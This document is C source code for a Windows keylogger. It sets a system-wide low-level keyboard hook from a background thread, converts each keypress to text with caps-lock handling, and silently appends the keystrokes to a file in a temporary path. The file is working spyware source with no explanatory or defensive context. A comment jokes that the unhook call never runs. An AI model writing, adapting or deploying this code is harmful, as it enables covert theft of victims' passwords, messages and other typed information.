#include "Logger.h"

static int IsCapsLock()
{
	return ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
}

static void RecordKeyPress(char* key)
{
	HANDLE hFile = CreateFileA(tempPath, FILE_APPEND_DATA, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == 0) { return; };

	WriteFile(hFile, key, strlen(key), 0, 0);

	CloseHandle(hFile);
}

static void HandleKeyDown(DWORD vkCode)
{
	switch (vkCode)
	{
	case 0x41: if (IsCapsLock()) { RecordKeyPress("A"); } else { RecordKeyPress("a"); } break;
	case 0x42: if (IsCapsLock()) { RecordKeyPress("B"); } else { RecordKeyPress("b"); } break;
	case 0x43: if (IsCapsLock()) { RecordKeyPress("C"); } else { RecordKeyPress("c"); } break;
	case 0x44: if (IsCapsLock()) { RecordKeyPress("D"); } else { RecordKeyPress("d"); } break;
	case 0x45: if (IsCapsLock()) { RecordKeyPress("E"); } else { RecordKeyPress("e"); } break;
	case 0x46: if (IsCapsLock()) { RecordKeyPress("F"); } else { RecordKeyPress("f"); } break;
	case 0x47: if (IsCapsLock()) { RecordKeyPress("G"); } else { RecordKeyPress("g"); } break;
	case 0x48: if (IsCapsLock()) { RecordKeyPress("H"); } else { RecordKeyPress("h"); } break;
	case 0x49: if (IsCapsLock()) { RecordKeyPress("I"); } else { RecordKeyPress("i"); } break;
	case 0x4A: if (IsCapsLock()) { RecordKeyPress("J"); } else { RecordKeyPress("j"); } break;
	case 0x4B: if (IsCapsLock()) { RecordKeyPress("K"); } else { RecordKeyPress("k"); } break;
	case 0x4C: if (IsCapsLock()) { RecordKeyPress("L"); } else { RecordKeyPress("l"); } break;
	case 0x4D: if (IsCapsLock()) { RecordKeyPress("M"); } else { RecordKeyPress("m"); } break;
	case 0x4E: if (IsCapsLock()) { RecordKeyPress("N"); } else { RecordKeyPress("n"); } break;
	case 0x4F: if (IsCapsLock()) { RecordKeyPress("O"); } else { RecordKeyPress("o"); } break;
	case 0x50: if (IsCapsLock()) { RecordKeyPress("P"); } else { RecordKeyPress("p"); } break;
	case 0x51: if (IsCapsLock()) { RecordKeyPress("Q"); } else { RecordKeyPress("q"); } break;
	case 0x52: if (IsCapsLock()) { RecordKeyPress("R"); } else { RecordKeyPress("r"); } break;
	case 0x53: if (IsCapsLock()) { RecordKeyPress("S"); } else { RecordKeyPress("s"); } break;
	case 0x54: if (IsCapsLock()) { RecordKeyPress("T"); } else { RecordKeyPress("t"); } break;
	case 0x55: if (IsCapsLock()) { RecordKeyPress("U"); } else { RecordKeyPress("u"); } break;
	case 0x56: if (IsCapsLock()) { RecordKeyPress("V"); } else { RecordKeyPress("v"); } break;
	case 0x57: if (IsCapsLock()) { RecordKeyPress("W"); } else { RecordKeyPress("w"); } break;
	case 0x58: if (IsCapsLock()) { RecordKeyPress("X"); } else { RecordKeyPress("x"); } break;
	case 0x59: if (IsCapsLock()) { RecordKeyPress("Y"); } else { RecordKeyPress("y"); } break;
	case 0x5A: if (IsCapsLock()) { RecordKeyPress("Z"); } else { RecordKeyPress("z"); } break;

	default:;
		char key[2048];
		char lpString[2048];
		uintptr_t scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);
		long lParamValue = (scanCode << 16);

		if (GetKeyNameTextA(lParamValue, lpString, 2048) == 0) { return; }
		if (strlen(lpString) > 1) {
			snprintf(key, 2048, "[%s]", lpString);
		}
		else {
			strncpy(key, lpString, 2048);
		}

		RecordKeyPress(key);

		break;
	}
}

static LRESULT __stdcall HandleEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;

	if (nCode == HC_ACTION) {
		switch (wParam)
		{
		case WM_KEYDOWN:
			HandleKeyDown(kbs->vkCode);
			break;
		default:
			break;
		}
	}

	CallNextHookEx(0, nCode, wParam, lParam);
}

static void Dispatcher()
{
	MSG Msg;

	while (GetMessage(&Msg, 0, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
}

static HHOOK InitHook()
{
	return SetWindowsHookEx(WH_KEYBOARD_LL, HandleEvent, 0, 0);
}

static int Unhook(HHOOK *hook)
{
	return UnhookWindowsHookEx(hook);
}

DWORD __stdcall KeyThread(LPVOID lpParameter)
{
	HHOOK hook = InitHook();
	if (hook == 0) { return 1; }

	Dispatcher();
	
	Unhook(hook); // will never get called :p

	return 0;
}
